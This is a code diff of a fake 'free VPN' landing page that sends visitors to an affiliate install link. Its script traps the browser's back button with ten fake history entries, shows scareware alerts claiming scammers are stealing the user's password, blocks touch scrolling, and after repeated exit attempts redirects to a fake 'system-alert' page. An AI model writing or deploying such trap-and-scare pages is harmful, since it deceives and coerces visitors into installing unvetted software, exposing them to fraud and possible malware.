@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="en">
+<!DOCTYPE html><html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -12,53 +11,52 @@
       font-family: Arial, sans-serif;
       color: #ffffff;
       text-align: center;
-    }
+    }.container {
+  padding: 20px;
+}
 
-    .container {
-      padding: 20px;
-    }
+.vpn-link {
+  display: inline-block;
+  width: 100%;
+  max-width: 480px;
+}
 
-    .vpn-link {
-      display: inline-block;
-      width: 100%;
-      max-width: 480px;
-    }
+.vpn-image {
+  width: 100%;
+  border-radius: 12px;
+  margin-bottom: 25px;
+  box-shadow: 0 4px 15px rgba(0,0,0,0.5);
+}
 
-    .vpn-image {
-      width: 100%;
-      border-radius: 12px;
-      margin-bottom: 25px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-    }
+.install-btn {
+  display: inline-block;
+  padding: 15px 30px;
+  background-color: #00c853;
+  color: #ffffff;
+  font-size: 18px;
+  font-weight: bold;
+  border-radius: 10px;
+  text-decoration: none;
+  box-shadow: 0 0 0 rgba(0, 200, 83, 0.7);
+  animation: breathing 2s infinite ease-in-out;
+}
 
-    .install-btn {
-      display: inline-block;
-      padding: 15px 30px;
-      background-color: #00c853;
-      color: #ffffff;
-      font-size: 18px;
-      font-weight: bold;
-      border-radius: 10px;
-      text-decoration: none;
-      box-shadow: 0 0 0 rgba(0, 200, 83, 0.7);
-      animation: breathing 2s infinite ease-in-out;
-    }
+@keyframes breathing {
+  0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
+  50% { box-shadow: 0 0 20px 10px rgba(0, 200, 83, 0.3); }
+  100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
+}
 
-    @keyframes breathing {
-      0% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
-      50% { box-shadow: 0 0 20px 10px rgba(0, 200, 83, 0.3); }
-      100% { box-shadow: 0 0 0 0 rgba(0, 200, 83, 0.7); }
-    }
+.disclaimer {
+  font-size: 13px;
+  color: #aaaaaa;
+  margin-top: 15px;
+}
 
-    .disclaimer {
-      font-size: 13px;
-      color: #aaaaaa;
-      margin-top: 15px;
-    }
+#exitAttempts {
+  display: none;
+}
 
-    #exitAttempts {
-      display: none;
-    }
   </style>
 </head>
 <body>
@@ -68,70 +66,48 @@
        href="https://www.gravelroat.info/click?offer_id=28736&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
        target="_blank">
       <img src="https://files.catbox.moe/52ox56.jpg" alt="VPN Promo Image" class="vpn-image">
-    </a>
+    </a><!-- Breathing Install Button -->
+<a class="install-btn" 
+   href="https://www.gravelroat.info/click?offer_id=28736&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
+   target="_blank">
+  Install Now
+</a>
 
-    <!-- Breathing Install Button -->
-    <a class="install-btn" 
-       href="https://www.gravelroat.info/click?offer_id=28736&pub_id=269631&pub_click_id=ADD_CLICK_ID_HERE&site=PASS_SITE_HERE" 
-       target="_blank">
-      Install Now
-    </a>
+<div class="disclaimer">
+  100% Free • Fast & Secure Connection • Only 22.3MB
+</div>
 
-    <div class="disclaimer">
-      100% Free • Fast & Secure Connection • Only 22.3MB
-    </div>
+<div id="exitAttempts" style="display: none;"></div>
 
-    <div id="exitAttempts" style="display: none;"></div>
-  </div>
-
-  <script>
+  </div>  <script>
     let attempts = 0;
-    const maxAttempts = 4;
+    const maxAttempts = 3;
     const exitAttemptsText = document.getElementById('exitAttempts');
 
-    // Push two fake history entries for stronger trap
-    history.pushState(null, null, location.href);
-    history.pushState(null, null, location.href);
+    // Push 10 fake history states
+    for (let i = 0; i < 10; i++) {
+      history.pushState({}, '', location.href);
+    }
 
-    window.onpopstate = function(event) {
-      history.go(1);
+    window.onpopstate = function () {
+      history.pushState({}, '', location.href);
       handleExitAttempt();
     };
 
     function handleExitAttempt() {
-      attempts++;
-      exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
-
-      const warnings = [
+      const messages = [
         "Scammers are accessing your password, install now",
         "Last chance to protect yourself!",
         "Your device is still at risk",
         "Final warning, install now!"
       ];
 
-      if (attempts <= maxAttempts) {
-        alert(`⚠️ ${warnings[attempts - 1]}`);
-
-        const alertBox = document.querySelector('.alert-box');
-        if (alertBox) {
-          alertBox.style.animation = 'none';
-          alertBox.offsetHeight;
-          alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
-        }
-
-        const style = document.createElement('style');
-        style.textContent = `
-          @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            20% { transform: translateX(-10px); }
-            40% { transform: translateX(10px); }
-            60% { transform: translateX(-10px); }
-            80% { transform: translateX(10px); }
-          }
-        `;
-        document.head.appendChild(style);
+      if (attempts < maxAttempts) {
+        alert(`\u26a0\ufe0f ${messages[attempts * 2] || messages[messages.length - 2]}`);
+        alert(`\u26a0\ufe0f ${messages[(attempts * 2) + 1] || messages[messages.length - 1]}`);
+        attempts++;
+        exitAttemptsText.textContent = `Warning: ${attempts}/3 attempts to exit`;
       } else {
-        // ✅ Redirect to new prelander after final back press
         window.location.href = "https://system-alert.netlify.app/";
       }
     }
@@ -140,6 +116,5 @@
     document.addEventListener('touchmove', function(e) {
       e.preventDefault();
     }, { passive: false });
-  </script>
-</body>
+  </script></body>
 </html>
